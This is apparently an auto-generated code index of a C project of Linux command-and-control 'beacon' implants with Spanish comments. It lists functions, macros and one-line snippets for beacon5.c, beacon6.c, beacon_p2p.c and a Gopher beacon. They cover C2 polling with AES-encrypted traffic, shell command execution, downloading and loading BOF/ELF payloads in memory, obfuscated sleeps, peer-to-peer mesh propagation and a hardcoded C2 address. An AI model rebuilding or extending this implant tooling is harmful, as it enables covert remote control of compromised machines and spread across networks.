- `cJSON_AddStringToObject` (line 1130) `cJSON_AddStringToObject(root, "output", output);`
- `cJSON_AddNumberToObject` (line 1133) `cJSON_AddNumberToObject(root, "pid", (double)getpid());`
- `cJSON_AddNullToObject` (line 1138) `cJSON_AddNullToObject(root, "result_portscan");`
- `cJSON_Delete` (line 1142) `cJSON_Delete(root);`
- `RAND_bytes` (line 1158) `RAND_bytes(iv_out, 16);`

**Macros:**
- `_GNU_SOURCE` (line 1) `#define _GNU_SOURCE`
- `C2_URL` (line 32) `#define C2_URL`
- `CLIENT_ID` (line 34) `#define CLIENT_ID`
- `MALEABLE` (line 35) `#define MALEABLE`
- `USER_AGENTS_COUNT` (line 36) `#define USER_AGENTS_COUNT`

**Structs:**
- `MemoryStruct` (line 50) - *=== ESTRUCTURAS ===*
- `Trampoline` (line 57) - *=== TRAMPOLINES ===*
- `SymbolResolver` (line 65)
- `TrampolineCache` (line 71) - *=== CACHE DE TRAMPOLINES ===*

#### `beacon5.c`
**Path:** `beacon5.c`
**File Doc:** *define _GNU_SOURCE include <stdio.h> include <stdlib.h> include <string.h> include <unistd.h> include <time.h> include <sys/types.h> include <sys/socket.h> include <netinet/in.h> include <arpa/inet.h> include <net/if.h> include <sys/ioctl.h> include <pwd.h> include <errno.h> include <openssl/buffer.h> include <curl/curl.h> include <openssl/rand.h> include <openssl/bio.h> include <openssl/evp.h> include <sys/mman.h> include <elf.h> include <dlfcn.h> include <fcntl.h> include <stdint.h> include <sys/wait.h> include <stdarg.h> include <netdb.h> include <pthread.h> include <arpa/inet.h> include <sys/select.h>*

**Functions:**
- `__attribute__` (line 182) `static void __attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...`
- `BeaconPrintf` (line 235) `void BeaconPrintf(int type, const char *fmt, ...)` - *=== BEACON API ===*
- `BeaconOutput` (line 247) `void BeaconOutput(int type, const char *data, int len)`
- `create_trampoline` (line 259) `static void* create_trampoline(void* target)` - *=== CRATE TRAPOLINE ===*
- `cleanup_trampolines` (line 295) `static void cleanup_trampolines(void)` - *=== CLEAN TRAMPOLINE ===*
- `get_or_create_trampoline` (line 310) `static void* get_or_create_trampoline(void* target)`
- `WriteMemoryCallback` (line 342) `static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)` - *=== CURL WRITE CALLBACK ===*
- `https_request` (line 359) `char* https_request(const char* url, const char* method, const char* post_data)` - *=== HTTPS REQUEST ===*
- `base64_encode` (line 448) `char* base64_encode(const unsigned char* input, int len)` - *=== BASE64 ===*
- `base64_decode` (line 464) `unsigned char* base64_decode(const char* input, int* len)`
- `aes256_cfb_encrypt` (line 488) `unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,
            ...` - *=== AES CFB ===*
- `aes256_cfb_decrypt` (line 515) `unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- `exec_cmd` (line 546) `char* exec_cmd(const char* cmd, int* out_len)` - *=== EXEC CMD ===*
- `page_align` (line 567) `static size_t page_align(size_t size)` - *=== Función auxiliar: alinear al tamaño de página ===*
- `RunELF` (line 572) `int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize, 
           unsi...`
- `get_local_ips` (line 954) `char* get_local_ips()` - *=== GET LOCAL IPs ===*
- `download_bof` (line 983) `unsigned char* download_bof(const char* url, size_t* out_size)` - *=== DOWNLOAD BOF ===*
- `run_bof_and_capture` (line 1005) `char* run_bof_and_capture(unsigned char* elf_data, uint32_t filesize,
                          c...` - *=== RUN BOF AND CAPTURE ===*
- `mesh_mark_seen` (line 1049) `void mesh_mark_seen(const char *msg_id)` - *========== UTILIDADES MESH ==========*
- `mesh_is_seen` (line 1057) `int mesh_is_seen(const char *msg_id)`
- `mesh_add_peer` (line 1069) `void mesh_add_peer(const char *ip, int port)`
- `mesh_cleanup_peers` (line 1094) `void mesh_cleanup_peers()`
- `mesh_send_to_peer` (line 1108) `int mesh_send_to_peer(const char *ip, int port, const mesh_msg_t *msg)` - *========== PROPAGACIÓN MESH ==========*
- `mesh_propagate` (line 1130) `void mesh_propagate(const char *command)`
- `mesh_discovery_thread` (line 1157) `void *mesh_discovery_thread(void *arg)` - *========== DISCOVERY THREAD ==========*
- `mesh_listener_thread` (line 1240) `void *mesh_listener_thread(void *arg)` - *========== MESH LISTENER THREAD ==========*
- `mesh_send_message` (line 1416) `void mesh_send_message(int type, const char* target, const char* payload)`
- `main` (line 1444) `int main(int argc, char **argv)` - *=== MAIN ===*
- `void` (line 104) `typedef void (*bof_func_t)(char*, int);` - *=== TIPOS Y SÍMBOLOS FALTANTES ===*
- `volatile` (line 188) `asm volatile( // Guardar frame pointer "push %%rbp\n\t" "mov %%rsp, %%rbp\n\t" // Guardar callee-saved registers "push %%rbx\n\t" "push %%r12\n\t" "push %%r13\n\t" "push %%r14\n\t" "push %%r15\n\t" //` - *CRÍTICO: El stack DEBE estar alineado a 16 bytes ANTES del call Después de 'call', RSP está desalineado 8 bytes (por el push del return address) Entonces necesitamos RSP % 16 == 8 justo antes del call*
- `va_start` (line 238) `va_start(args, fmt);`
- `va_end` (line 242) `va_end(args);`
- `memcpy` (line 253) `memcpy(g_beacon_output + g_output_len, data, len);`
- `fprintf` (line 266) `fprintf(stderr, "[!] Trampolín: mmap falló\n");`
- `munmap` (line 282) `munmap(code, code_size);`
- `free` (line 299) `free(g_trampolines);`
- `fflush` (line 363) `fflush(stderr);`
- `curl_easy_setopt` (line 377) `curl_easy_setopt(curl, CURLOPT_URL, url);`
- `curl_easy_cleanup` (line 422) `curl_easy_cleanup(curl);`
- `BIO_set_flags` (line 454) `BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);`
- `BIO_write` (line 455) `BIO_write(b64, input, len);`
- `BIO_flush` (line 456) `BIO_flush(b64);`
- `BIO_get_mem_ptr` (line 457) `BIO_get_mem_ptr(b64, &bptr);`
- `BIO_free_all` (line 461) `BIO_free_all(b64);`
- `AES_init_ctx` (line 491) `AES_init_ctx(&ctx, key);`
- `AES_ECB_encrypt` (line 499) `AES_ECB_encrypt(&ctx, encrypted_iv);`
- `memset` (line 508) `memset(iv_buf + block_size, 0, 16 - block_size);`
- `pclose` (line 551) `pclose(fp);`
- `perror` (line 743) `perror("calloc");`
- `call_bof_isolated` (line 939) `call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);`
- `close` (line 962) `close(sockfd);`
- `strdup` (line 963) `return strdup("127.0.0.1");`
- `inet_ntop` (line 973) `inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);`
- `strcat` (line 975) `strcat(result, ip);`
- `strlen` (line 979) `return strlen(result) > 0 ? result : strdup("127.0.0.1");`
- `printf` (line 994) `printf("[DEBUG] download_bof: descargados %zu bytes\n", *out_size);`
- `pthread_mutex_lock` (line 1051) `pthread_mutex_lock(&g_mesh.seen_mutex);`
- `strncpy` (line 1053) `strncpy(g_mesh.seen_msgs[idx], msg_id, 63);`
- `pthread_mutex_unlock` (line 1055) `pthread_mutex_unlock(&g_mesh.seen_mutex);`
- `setsockopt` (line 1113) `setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));`
- `inet_pton` (line 1117) `inet_pton(AF_INET, ip, &addr.sin_addr);`
- `send` (line 1126) `send(sock, buffer, len, 0);`
- `snprintf` (line 1134) `snprintf(msg.msg_id, sizeof(msg.msg_id), "%lx-%lx", (unsigned long)time(NULL), (unsigned long)rand());`
- `FD_ZERO` (line 1188) `FD_ZERO(&readfds);`
- `FD_SET` (line 1190) `FD_SET(sock, &readfds);`
- `sendto` (line 1200) `sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr*)&bcast, sizeof(bcast));`
- `listen` (line 1257) `listen(server_sock, 10);`
- `pthread_mutex_init` (line 1460) `pthread_mutex_init(&g_mesh.peers_mutex, NULL);`
- `pthread_detach` (line 1468) `pthread_detach(tid_discovery);`
- `srand` (line 1473) `srand(time(NULL));`
- `sscanf` (line 1477) `sscanf(KEY_HEX + i * 2, "%2hhx", &AES_KEY[i]);`
- `sleep` (line 1494) `sleep(6);`
- `gethostname` (line 1591) `gethostname(hostname, sizeof(hostname) - 1);`
- `cJSON_AddStringToObject` (line 1599) `cJSON_AddStringToObject(root, "output", output);`
- `cJSON_AddNumberToObject` (line 1602) `cJSON_AddNumberToObject(root, "pid", (double)getpid());`
- `cJSON_AddNullToObject` (line 1607) `cJSON_AddNullToObject(root, "result_portscan");`
- `cJSON_Delete` (line 1611) `cJSON_Delete(root);`
- `RAND_bytes` (line 1627) `RAND_bytes(iv_out, 16);`

**Macros:**
- `_GNU_SOURCE` (line 1) `#define _GNU_SOURCE`
- `MAX_PEERS` (line 35) `#define MAX_PEERS`
- `DISCOVERY_PORT` (line 38) `#define DISCOVERY_PORT`
- `DISCOVERY_INTERVAL` (line 39) `#define DISCOVERY_INTERVAL`
- `MAX_TTL` (line 40) `#define MAX_TTL`
- `MESH_MSG_SIZE` (line 41) `#define MESH_MSG_SIZE`
- `C2_URL` (line 42) `#define C2_URL`
- `CLIENT_ID` (line 45) `#define CLIENT_ID`
- `MALEABLE` (line 46) `#define MALEABLE`
- `USER_AGENTS_COUNT` (line 47) `#define USER_AGENTS_COUNT`

**Structs:**
- `MemoryStruct` (line 61) - *=== ESTRUCTURAS ===*
- `peer_t` (line 68) - *=== ESTRUCTURAS MESH ===*
- `mesh_msg_t` (line 75)
- `Trampoline` (line 98) - *=== TRAMPOLINES ===*
- `SymbolResolver` (line 106)
- `TrampolineCache` (line 112) - *=== CACHE DE TRAMPOLINES ===*

#### `beacon6.c`
**Path:** `beacon6.c`
**File Doc:** *define _GNU_SOURCE include <stdio.h> include <stdlib.h> include <string.h> include <unistd.h> include <time.h> include <sys/types.h> include <sys/socket.h> include <netinet/in.h> include <arpa/inet.h> include <net/if.h> include <sys/ioctl.h> include <pwd.h> include <errno.h> include <openssl/buffer.h> include <curl/curl.h> include <openssl/rand.h> include <openssl/bio.h> include <openssl/evp.h> include <sys/mman.h> include <elf.h> include <dlfcn.h> include <fcntl.h> include <stdint.h> include <sys/wait.h> include <stdarg.h> include <netdb.h> include <poll.h>*

**Functions:**
- `__attribute__` (line 142) `static void __attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...`
- `delay_ms` (line 195) `static void delay_ms(int ms)` - *sleep ofuscated using poll*
- `is_prime` (line 202) `static unsigned int is_prime(unsigned int x)` - *-- Lógica de números primos (sin cambios esenciales) ---*
- `get_nth_prime_limited` (line 218) `static unsigned int get_nth_prime_limited(unsigned int n)` - *if (x < 2) return 0; if (x == 2) return 1; if ((x & 1) == 0) return 0; /* even > 2 unsigned int d = 3; while (d * d <= x) { if (x % d == 0) return 0; d += 2; } return 1; } /* Returns the n-th prime (1-indexed). Returns 0 if n <= 0.*
- `portable_rand_19k_29k` (line 242) `static unsigned int portable_rand_19k_29k(void)`
- `BeaconPrintf` (line 255) `void BeaconPrintf(int type, const char *fmt, ...)` - *=== BEACON API ===*
- `BeaconOutput` (line 267) `void BeaconOutput(int type, const char *data, int len)`
- `create_trampoline` (line 279) `static void* create_trampoline(void* target)` - *=== CRATE TRAPOLINE ===*
- `cleanup_trampolines` (line 315) `static void cleanup_trampolines(void)` - *=== CLEAN TRAMPOLINE ===*
- `get_or_create_trampoline` (line 330) `static void* get_or_create_trampoline(void* target)`
- `WriteMemoryCallback` (line 362) `static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)` - *=== CURL WRITE CALLBACK ===*
- `https_request` (line 379) `char* https_request(const char* url, const char* method, const char* post_data)` - *=== HTTPS REQUEST ===*
- `base64_encode` (line 468) `char* base64_encode(const unsigned char* input, int len)` - *=== BASE64 ===*
- `base64_decode` (line 484) `unsigned char* base64_decode(const char* input, int* len)`
- `aes256_cfb_encrypt` (line 508) `unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,
            ...` - *=== AES CFB ===*
- `aes256_cfb_decrypt` (line 535) `unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- `exec_cmd` (line 566) `char* exec_cmd(const char* cmd, int* out_len)` - *=== EXEC CMD ===*
- `page_align` (line 587) `static size_t page_align(size_t size)` - *=== Función auxiliar: alinear al tamaño de página ===*
- `RunELF` (line 592) `int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize, 
           unsi...`
- `get_local_ips` (line 974) `char* get_local_ips()` - *=== GET LOCAL IPs ===*
- `download_bof` (line 1003) `unsigned char* download_bof(const char* url, size_t* out_size)` - *=== DOWNLOAD BOF ===*
- `run_bof_and_capture` (line 1025) `char* run_bof_and_capture(unsigned char* elf_data, uint32_t filesize,
                          c...` - *=== RUN BOF AND CAPTURE ===*
- `main` (line 1069) `int main()` - *=== MAIN ===*
- `void` (line 65) `typedef void (*bof_func_t)(char*, int);` - *=== TIPOS Y SÍMBOLOS FALTANTES ===*
- `volatile` (line 148) `asm volatile( // Guardar frame pointer "push %%rbp\n\t" "mov %%rsp, %%rbp\n\t" // Guardar callee-saved registers "push %%rbx\n\t" "push %%r12\n\t" "push %%r13\n\t" "push %%r14\n\t" "push %%r15\n\t" //` - *CRÍTICO: El stack DEBE estar alineado a 16 bytes ANTES del call Después de 'call', RSP está desalineado 8 bytes (por el push del return address) Entonces necesitamos RSP % 16 == 8 justo antes del call*
- `poll` (line 197) `poll(&p, 0, ms);`
- `srand` (line 247) `srand((unsigned int)time(NULL));`
- `va_start` (line 258) `va_start(args, fmt);`
- `va_end` (line 262) `va_end(args);`
- `memcpy` (line 273) `memcpy(g_beacon_output + g_output_len, data, len);`
- `fprintf` (line 286) `fprintf(stderr, "[!] Trampolín: mmap falló\n");`
- `munmap` (line 302) `munmap(code, code_size);`
- `free` (line 319) `free(g_trampolines);`
- `fflush` (line 383) `fflush(stderr);`
- `curl_easy_setopt` (line 397) `curl_easy_setopt(curl, CURLOPT_URL, url);`
- `curl_easy_cleanup` (line 442) `curl_easy_cleanup(curl);`
- `BIO_set_flags` (line 474) `BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);`
- `BIO_write` (line 475) `BIO_write(b64, input, len);`
- `BIO_flush` (line 476) `BIO_flush(b64);`
- `BIO_get_mem_ptr` (line 477) `BIO_get_mem_ptr(b64, &bptr);`
- `BIO_free_all` (line 481) `BIO_free_all(b64);`
- `AES_init_ctx` (line 511) `AES_init_ctx(&ctx, key);`
- `AES_ECB_encrypt` (line 519) `AES_ECB_encrypt(&ctx, encrypted_iv);`
- `memset` (line 528) `memset(iv_buf + block_size, 0, 16 - block_size);`
- `pclose` (line 571) `pclose(fp);`
- `perror` (line 763) `perror("calloc");`
- `call_bof_isolated` (line 959) `call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);`
- `close` (line 982) `close(sockfd);`
- `strdup` (line 983) `return strdup("127.0.0.1");`
- `inet_ntop` (line 993) `inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);`
- `strcat` (line 995) `strcat(result, ip);`
- `strlen` (line 999) `return strlen(result) > 0 ? result : strdup("127.0.0.1");`
- `printf` (line 1014) `printf("[DEBUG] download_bof: descargados %zu bytes\n", *out_size);`
- `sscanf` (line 1075) `sscanf(KEY_HEX + i * 2, "%2hhx", &AES_KEY[i]);`
- `snprintf` (line 1082) `snprintf(full_url, sizeof(full_url), "%s%s%s", C2_URL, MALEABLE, CLIENT_ID);`
- `gethostname` (line 1191) `gethostname(hostname, sizeof(hostname) - 1);`
- `cJSON_AddStringToObject` (line 1199) `cJSON_AddStringToObject(root, "output", output);`
- `cJSON_AddNumberToObject` (line 1202) `cJSON_AddNumberToObject(root, "pid", (double)getpid());`
- `cJSON_AddNullToObject` (line 1207) `cJSON_AddNullToObject(root, "result_portscan");`
- `cJSON_Delete` (line 1211) `cJSON_Delete(root);`
- `RAND_bytes` (line 1228) `RAND_bytes(iv_out, 16);`

**Macros:**
- `_GNU_SOURCE` (line 1) `#define _GNU_SOURCE`
- `C2_URL` (line 34) `#define C2_URL`
- `CLIENT_ID` (line 36) `#define CLIENT_ID`
- `MALEABLE` (line 37) `#define MALEABLE`
- `USER_AGENTS_COUNT` (line 38) `#define USER_AGENTS_COUNT`

**Structs:**
- `MemoryStruct` (line 52) - *=== ESTRUCTURAS ===*
- `Trampoline` (line 59) - *=== TRAMPOLINES ===*
- `SymbolResolver` (line 67)
- `TrampolineCache` (line 73) - *=== CACHE DE TRAMPOLINES ===*

#### `beacon_p2p.c`
**Path:** `beacon_p2p.c`
**File Doc:** *define _GNU_SOURCE include <stdio.h> include <stdlib.h> include <string.h> include <unistd.h> include <time.h> include <sys/types.h> include <sys/socket.h> include <netinet/in.h> include <arpa/inet.h> include <net/if.h> include <sys/ioctl.h> include <pwd.h> include <errno.h> include <openssl/buffer.h> include <curl/curl.h> include <openssl/rand.h> include <openssl/bio.h> include <openssl/evp.h> include <sys/mman.h> include <elf.h> include <dlfcn.h> include <fcntl.h> include <stdint.h> include <sys/wait.h> include <stdarg.h> include <netdb.h> include <pthread.h>  include "beacon.h"*

**Functions:**
- `BeaconDataParse` (line 91) `void BeaconDataParse(datap *parser, char *buffer, int size)` - *======================================================================= FUNCIONES DE LA API DE BEACON (para BOFs) =======================================================================*
- `BeaconDataPtr` (line 96) `char *BeaconDataPtr(datap *parser, int size)`
- `BeaconDataInt` (line 104) `int BeaconDataInt(datap *parser)`
- `BeaconDataShort` (line 110) `short BeaconDataShort(datap *parser)`
- `BeaconDataLength` (line 116) `int BeaconDataLength(datap *parser)`
- `BeaconDataExtract` (line 120) `char *BeaconDataExtract(datap *parser, int *size)`
- `BeaconPrintf` (line 128) `void BeaconPrintf(int type, const char *fmt, ...)`
- `BeaconOutput` (line 141) `void BeaconOutput(int type, const char *data, int len)`
- `__attribute__` (line 228) `static void __attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...`
- `create_trampoline` (line 258) `static void* create_trampoline(void* target)`
- `cleanup_trampolines` (line 283) `static void cleanup_trampolines(void)`
- `get_or_create_trampoline` (line 296) `static void* get_or_create_trampoline(void* target)`
- `page_align` (line 317) `static size_t page_align(size_t size)`
- `RunELF` (line 323) `int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize,
           unsig...`
- `WriteMemoryCallback` (line 554) `static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)`
- `https_request` (line 574) `char* https_request(const char* url, const char* method, const char* post_data)`
- `base64_encode` (line 624) `char* base64_encode(const unsigned char* input, int len)`
- `base64_decode` (line 640) `unsigned char* base64_decode(const char* input, int* len)`
- `aes256_cfb_encrypt` (line 653) `unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- `aes256_cfb_decrypt` (line 680) `unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- `exec_cmd` (line 712) `char* exec_cmd(const char* cmd, int* out_len)` - *======================================================================= UTILIDADES: ejecutar comandos shell, obtener IPs, etc. =======================================================================*
- `get_local_ips` (line 728) `char* get_local_ips()`
- `download_bof` (line 756) `unsigned char* download_bof(const char* url, size_t* out_size)`
- `run_bof_and_capture` (line 765) `char* run_bof_and_capture(unsigned char* elf_data, uint32_t filesize,
                          c...`
- `add_peer` (line 783) `void add_peer(struct in_addr ip, int port, const char *id)` - *======================================================================= FUNCIONES P2P =======================================================================*
- `peer_discovery_thread` (line 806) `void *peer_discovery_thread(void *arg)`
- `handle_peer_connection` (line 845) `void *handle_peer_connection(void *arg)`
- `peer_server_thread` (line 915) `void *peer_server_thread(void *arg)`
- `send_to_peer` (line 934) `char* send_to_peer(peer_t *peer, const char *data, int *out_len)`
- `send_to_c2_or_peer` (line 967) `char* send_to_c2_or_peer(const char *url, const char *method, const char *data, int *out_len)`
- `execute_generic_command` (line 996) `char* execute_generic_command(const char *cmd, int *out_len)` - *======================================================================= EJECUTOR DE COMANDOS (unificado para shell y BOF) =======================================================================*
- `main` (line 1031) `int main()` - *======================================================================= MAIN =======================================================================*
- `va_start` (line 132) `va_start(args, fmt);`
- `va_end` (line 136) `va_end(args);`
- `memcpy` (line 147) `memcpy(g_beacon_output + g_output_len, data, len);`
- `void` (line 159) `typedef void (*bof_func_t)(char*, int);`
- `volatile` (line 231) `asm volatile( "push %%rbp\n\t" "mov %%rsp, %%rbp\n\t" "push %%rbx\n\t" "push %%r12\n\t" "push %%r13\n\t" "push %%r14\n\t" "push %%r15\n\t" "sub $8, %%rsp\n\t" "mov %0, %%rdi\n\t" "mov %1, %%rsi\n\t" "`
- `munmap` (line 286) `munmap(g_trampolines[i].addr, g_trampolines[i].size);`
- `free` (line 287) `free(g_trampolines);`
- `call_bof_isolated` (line 534) `call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);`
- `curl_easy_setopt` (line 579) `curl_easy_setopt(curl, CURLOPT_URL, url);`
- `curl_easy_cleanup` (line 606) `curl_easy_cleanup(curl);`
- `BIO_set_flags` (line 629) `BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);`
- `BIO_write` (line 630) `BIO_write(b64, input, len);`
- `BIO_flush` (line 631) `BIO_flush(b64);`
- `BIO_get_mem_ptr` (line 633) `BIO_get_mem_ptr(b64, &bptr);`
- `BIO_free_all` (line 637) `BIO_free_all(b64);`
- `AES_init_ctx` (line 657) `AES_init_ctx(&ctx, key);`
- `AES_ECB_encrypt` (line 665) `AES_ECB_encrypt(&ctx, encrypted_iv);`
- `memset` (line 673) `memset(iv_buf + block_size, 0, 16 - block_size);`
- `pclose` (line 723) `pclose(fp);`
- `close` (line 737) `close(sockfd);`
- `strdup` (line 738) `return strdup("127.0.0.1");`
- `inet_ntop` (line 748) `inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);`
- `strcat` (line 750) `strcat(result, ip);`
- `strlen` (line 754) `return strlen(result) > 0 ? result : strdup("127.0.0.1");`
- `pthread_mutex_lock` (line 784) `pthread_mutex_lock(&g_peer_lock);`
- `pthread_mutex_unlock` (line 789) `pthread_mutex_unlock(&g_peer_lock);`
- `strncpy` (line 800) `strncpy(g_peers[g_peer_count].id, id, sizeof(g_peers[g_peer_count].id)-1);`
- `setsockopt` (line 810) `setsockopt(udp_sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));`
- `gethostname` (line 817) `gethostname(my_id, sizeof(my_id)-1);`
- `snprintf` (line 818) `snprintf(my_id + strlen(my_id), sizeof(my_id)-strlen(my_id), ":%d", getpid());`
- `bind` (line 825) `bind(udp_sock, (struct sockaddr*)&listen_addr, sizeof(listen_addr));`
- `sendto` (line 828) `sendto(udp_sock, my_id, strlen(my_id), 0, (struct sockaddr*)&bc_addr, sizeof(bc_addr));`
- `sleep` (line 838) `sleep(BROADCAST_INTERVAL);`
- `write` (line 864) `write(fd, &resp_hdr, sizeof(resp_hdr));`
- `RAND_bytes` (line 871) `RAND_bytes(iv_out, 16);`
- `listen` (line 922) `listen(listen_fd, 10);`
- `pthread_create` (line 929) `pthread_create(&tid, NULL, handle_peer_connection, (void*)(intptr_t)client_fd);`
- `pthread_detach` (line 930) `pthread_detach(tid);`
- `read` (line 959) `read(peer->fd, cipher, resp_hdr.payload_len);`
- `printf` (line 1032) `printf("[*] Beacon P2P starting...\n");`
- `srand` (line 1033) `srand(time(NULL));`
- `sscanf` (line 1037) `sscanf(KEY_HEX + i * 2, "%2hhx", &AES_KEY[i]);`
- `cJSON_AddStringToObject` (line 1097) `cJSON_AddStringToObject(root, "output", output);`
- `cJSON_AddNumberToObject` (line 1100) `cJSON_AddNumberToObject(root, "pid", (double)getpid());`
- `cJSON_AddNullToObject` (line 1105) `cJSON_AddNullToObject(root, "result_portscan");`
- `cJSON_Delete` (line 1108) `cJSON_Delete(root);`

**Macros:**
- `_GNU_SOURCE` (line 1) `#define _GNU_SOURCE`
- `C2_URL` (line 37) `#define C2_URL`
- `CLIENT_ID` (line 38) `#define CLIENT_ID`
- `MALEABLE` (line 39) `#define MALEABLE`
- `USER_AGENTS_COUNT` (line 40) `#define USER_AGENTS_COUNT`
- `PEER_DISCOVERY_PORT` (line 41) `#define PEER_DISCOVERY_PORT`
- `PEER_TCP_PORT` (line 43) `#define PEER_TCP_PORT`
- `PEER_MAGIC` (line 44) `#define PEER_MAGIC`
- `PEER_VERSION` (line 45) `#define PEER_VERSION`
- `BROADCAST_INTERVAL` (line 46) `#define BROADCAST_INTERVAL`
- `MAX_PEERS` (line 47) `#define MAX_PEERS`

**Structs:**
- `MemoryStruct` (line 549) - *======================================================================= FUNCIONES DE COMUNICACIÓN (HTTPS + BASE64 + AES) =======================================================================*
- `peer_t` (line 59) - *======================================================================= ESTRUCTURAS P2P =======================================================================*
- `p2p_header_t` (line 72)
- `Trampoline` (line 155) - *======================================================================= TRAMPOLINES Y RELOCACIÓN (RunELF) - SIN CAMBIOS =======================================================================*
- `SymbolResolver` (line 161)
- `TrampolineCache` (line 170)

#### `beacon.c`
**Path:** `beacons/v1/beacon.c`

**Functions:**
- `report_result` (line 23) `static void report_result(const bsb_config_t *cfg,
                           const char *command...` - *This beacon uses exponential backoff on failures to reduce noise when the C2 is unreachable. The backoff resets on the first successful command exchange.  define _GNU_SOURCE include <stdio.h> include <stdlib.h> include <string.h> include <unistd.h> include <time.h> include <pwd.h> include <openssl/rand.h> include "beacon_common.h" include "cJSON.h"*
- `execute_command` (line 96) `static char *execute_command(const bsb_config_t *cfg, const char *command)`
- `main` (line 145) `int main(void)`
- `gethostname` (line 28) `gethostname(hostname, sizeof(hostname) - 1);`
- `cJSON_AddStringToObject` (line 36) `cJSON_AddStringToObject(root, "output", output);`
- `cJSON_AddNumberToObject` (line 39) `cJSON_AddNumberToObject(root, "pid", (double)getpid());`
- `cJSON_AddNullToObject` (line 44) `cJSON_AddNullToObject(root, "result_portscan");`
- `cJSON_Delete` (line 48) `cJSON_Delete(root);`
- `free` (line 51) `free(ips);`
- `RAND_bytes` (line 57) `RAND_bytes(iv_out, 16);`
- `memcpy` (line 67) `memcpy(full_enc, iv_out, 16);`
- `snprintf` (line 73) `snprintf(report_url, sizeof(report_url), "%s%s", cfg->c2.url, cfg->c2.report_uri);`
- `srand` (line 147) `srand(time(NULL));`
- `fprintf` (line 152) `fprintf(stderr, "config error: %s\n", cfg_err);`
- `bsb_backoff_init` (line 163) `bsb_backoff_init(&backoff, cfg.backoff.base_seconds, cfg.backoff.max_seconds);`
- `sleep` (line 173) `sleep(bsb_backoff_next(&backoff));`
- `bsb_backoff_reset` (line 200) `bsb_backoff_reset(&backoff);`
- `bsb_output_cleanup` (line 211) `bsb_output_cleanup();`

**Macros:**
- `_GNU_SOURCE` (line 13) `#define _GNU_SOURCE`

#### `gopher_beacon.c`
**Path:** `beacons/v1/gopher_beacon.c`
**File Doc:** *define _GNU_SOURCE include <stdio.h> include <stdlib.h> include <string.h> include <unistd.h> include <time.h> include <sys/types.h> include <sys/socket.h> include <netinet/in.h> include <arpa/inet.h> include <net/if.h> include <sys/ioctl.h> include <pwd.h> include <errno.h> include <openssl/buffer.h> include <openssl/rand.h> include <sys/mman.h> include <elf.h> include <dlfcn.h> include <fcntl.h> include <stdint.h> include <sys/wait.h> include <stdarg.h> include <netdb.h>  include "beacon.h" include "aes.h" include "cJSON.h"  define C2              "10.10.14.57"*

**Functions:**
- `__attribute__` (line 137) `static void __attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...`
- `BeaconPrintf` (line 190) `void BeaconPrintf(int type, const char *fmt, ...)` - *=== BEACON API ===*
- `BeaconOutput` (line 202) `void BeaconOutput(int type, const char *data, int len)`
- `create_trampoline` (line 214) `static void* create_trampoline(void* target)` - *=== CRATE TRAPOLINE ===*
- `cleanup_trampolines` (line 250) `static void cleanup_trampolines(void)` - *=== CLEAN TRAMPOLINE ===*
- `get_or_create_trampoline` (line 265) `static void* get_or_create_trampoline(void* target)`
- `WriteMemoryCallback` (line 297) `static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)` - *=== CURL WRITE CALLBACK ===*
- `gopher_request` (line 314) `char* gopher_request(const char* host, int port, const char* selector, const char* method, const ...` - *=== GOPHER REQUEST () ===*
- `base64_encode` (line 377) `char* base64_encode(const unsigned char* input, int len)` - *=== BASE64 ===*
- `base64_decode` (line 393) `unsigned char* base64_decode(const char* input, int* len)`
- `aes256_cfb_encrypt` (line 417) `unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,
            ...` - *=== AES CFB ===*
- `aes256_cfb_decrypt` (line 444) `unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- `exec_cmd` (line 475) `char* exec_cmd(const char* cmd, int* out_len)` - *=== EXEC CMD ===*
- `page_align` (line 506) `static size_t page_align(size_t size)` - *=== Función auxiliar: alinear al tamaño de página ===*
- `RunELF` (line 511) `int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize, 
           unsi...`
- `get_local_ips` (line 893) `char* get_local_ips()` - *=== GET LOCAL IPs ===*
- `download_bof` (line 922) `unsigned char* download_bof(const char* bof_selector, size_t* out_size)` - *=== DOWNLOAD BOF ===*
- `run_bof_and_capture` (line 950) `char* run_bof_and_capture(unsigned char* elf_data, uint32_t filesize,
                          c...` - *=== RUN BOF AND CAPTURE ===*
- `main` (line 994) `int main()` - *=== MAIN ===*
- `void` (line 60) `typedef void (*bof_func_t)(char*, int);` - *=== TIPOS Y SÍMBOLOS FALTANTES ===*
